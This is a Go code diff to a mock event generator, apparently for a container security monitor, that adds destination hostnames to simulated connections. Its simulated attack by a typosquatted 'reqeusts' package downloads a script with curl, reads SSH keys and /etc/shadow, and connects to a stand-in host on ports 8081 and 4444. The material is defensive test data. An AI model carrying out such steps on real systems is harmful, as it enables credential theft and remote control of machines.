@@ -42,7 +42,7 @@ func NewMock() *Mock {
 				{Kind: model.KindOpen, Comm: "node", Path: "/app/node_modules/express/index.js"},
 				{Kind: model.KindOpen, Comm: "node", Path: "/etc/hosts"},
 				{Kind: model.KindConnect, Comm: "node", DstIP: "172.18.0.4", DstPort: 5432},
-				{Kind: model.KindConnect, Comm: "node", DstIP: "104.16.2.35", DstPort: 443},
+				{Kind: model.KindConnect, Comm: "node", DstIP: "104.16.2.35", DstPort: 443, DstHost: "api.github.com"},
 			}},
 			{name: "worker", image: "python:3.12-slim", normal: []model.Event{
 				{Kind: model.KindExec, Comm: "python3", Args: "python3 -m worker"},
@@ -53,7 +53,7 @@ func NewMock() *Mock {
 			{name: "pkg-reqeusts", image: "demo/reqeusts:1.0.2", attacker: true, normal: []model.Event{
 				{Kind: model.KindExec, Comm: "python3", Args: "python3 -c import reqeusts"},
 				{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py"},
-				{Kind: model.KindConnect, Comm: "python3", DstIP: "151.101.0.223", DstPort: 443},
+				{Kind: model.KindConnect, Comm: "python3", DstIP: "151.101.0.223", DstPort: 443, DstHost: "files.pythonhosted.org"},
 			}},
 		},
 	}
@@ -65,8 +65,8 @@ var attack = []model.Event{
 	{Kind: model.KindExec, Comm: "curl", Args: "curl -s http://203.0.113.7/p.sh"},
 	{Kind: model.KindOpen, Comm: "python3", Path: "/root/.ssh/id_rsa"},
 	{Kind: model.KindOpen, Comm: "python3", Path: "/etc/shadow"},
-	{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 8081},
-	{Kind: model.KindConnect, Comm: "sh", DstIP: "203.0.113.7", DstPort: 4444},
+	{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 8081, DstHost: "cdn.reqeusts-update.test"},
+	{Kind: model.KindConnect, Comm: "sh", DstIP: "203.0.113.7", DstPort: 4444, DstHost: "cdn.reqeusts-update.test"},
 }
 
 func (m *Mock) Run(ctx context.Context, out chan<- model.Event) error {
